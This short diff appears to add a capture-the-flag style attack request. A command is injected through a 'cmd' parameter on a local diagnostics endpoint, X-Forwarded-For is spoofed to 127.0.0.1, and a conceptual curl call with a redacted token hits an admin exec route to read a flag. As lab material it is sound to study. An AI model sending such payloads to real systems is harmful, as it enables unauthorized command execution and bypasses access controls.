@@ -1,0 +1,8 @@
+GET /staging-infra-4091/diagnostics?cmd=[URL-ENCODED-CURL-COMMAND] HTTP/1.1
+Host: 127.0.0.1:8288
+X-Forwarded-For: 127.0.0.1
+Cookie: staging_token=[REDACTED]
+
+Comando conceptual:
+curl -sS -H 'Authorization: Bearer [JWT_REDACTED]' \
+  http://127.0.0.1:9090/admin/exec?action=cat_flag
